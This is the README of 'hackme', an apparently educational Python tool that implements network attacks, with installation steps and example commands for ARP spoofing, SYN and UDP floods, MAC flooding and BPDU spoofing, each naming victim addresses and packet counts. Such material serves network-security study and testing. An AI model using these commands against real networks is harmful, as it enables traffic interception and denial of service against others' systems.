
# Hack Me

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
[![GitHub license](https://img.shields.io/github/license/nadzyah/hackme?style=for-the-badge)](https://github.com/nadzyah/hackme/blob/main/LICENSE)

A collection of scripts that implement different network attacks. **For informational purposes only.**

See the article about how to use it [here](https://medium.com/@nadzeya/exploring-your-networks-vulnerabilities-can-you-hack-it-836aee46c156)

Any contributor to this project doesn't take any responsibility for the illegal usage of any script from this project.

# Installation and Usage

The tested environment:
* Python v3.10
* Ubuntu 22.04 LTS

Make sure that `python3-scapy` is installed on your system: `sudo apt-get install python3-scapy`

You can either run `hackmeapp.py` from a checkout of the code or install it like any other Python project. Remember that most of the scripts here can be executed only with the root privileges, so you need to run it with sudo.

```bash
$ sudo pip3 install hackme
$ sudo hackme
usage: hackme [-h] [--debug] {attack} ...
```

To enter the debug mode, use the `--debug` option after the `hackme` command.

To get the attack description in the terminal, enter `hackme <attack> --desc`


# Implemented Attacks

The following commands include the `--debug` option, which is not required to execute an attack.

## ARP Spoofing

Example usage:

```bash
$ sudo hackme --debug arpspoof -i wlp2s0 -m aa:aa:aa:aa:aa:aa -gm BB-BB-BB-BB-BB-BB -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
```

where:

* `wlp2s0` — your network interface
* `aa:aa:aa:aa:aa:aa` — the interface MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
* `bb:bb:bb:bb:bb:bb` — the gateway's MAC-address
* `192.168.0.1` — the gateway's IP-address
* `cc:cc:cc:cc:cc:cc` — the victim's MAC-address
* `192.168.0.108` — the victim's IP-address

Run `sudo hackme arpspoof --help` to get more information.

## SYN Flood

Example usage:

```bash
$ sudo hackme --debug synflood -d 172.17.17.10 -p 443 -c 1000
```
where:

* `172.17.17.10` — server's IP-address
* `443` — server's port
* `1000` — the number of packets to be sent

Run `sudo hackme synflood --help` to get more information.

## UDP Flood

Example usage:

```bash
$ sudo hackme --debug udpflood -d 172.17.17.10 -p 53 -c 1000
```

where:

* `172.17.17.10` — server's IP-address
* `53` — server's port
* `1000` — the number of packets to be sent

Run `sudo hackme udpflood --help` to get more information.

## MAC Flood

Example usage:

```bash
$ sudo hackme --debug macflood -i wlp2s0 -vm "aa:aa:aa:aa:aa:aa" -c 100000
```

where:

* `wlp2s0` — your network interface
* `aa:aa:aa:aa:aa:aa` — the victim's MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
* `100000` — the number of packets to be sent

Run `sudo hackme macflood --help` to get more information.

## BPDU Spoofing

Example usage:

```bash
sudo ./hackmeapp.py --debug stpspoof -i wlp2s0 -smac "aa:aa:aa:aa:aa:aa" -dmac "bb:bb:bb:bb:bb:bb" -p 4096
```

* `wlp2s0` — your network interface
* `aa:aa:aa:aa:aa:aa` — your MAC-address
* `bb:bb:bb:bb:bb:bb` — victim switch's MAC-address
* `4096` — priority for choosing the root switch (the lower the number, the higher the priority, so make sure it's low enough to become the root). Must be divisible by 4096
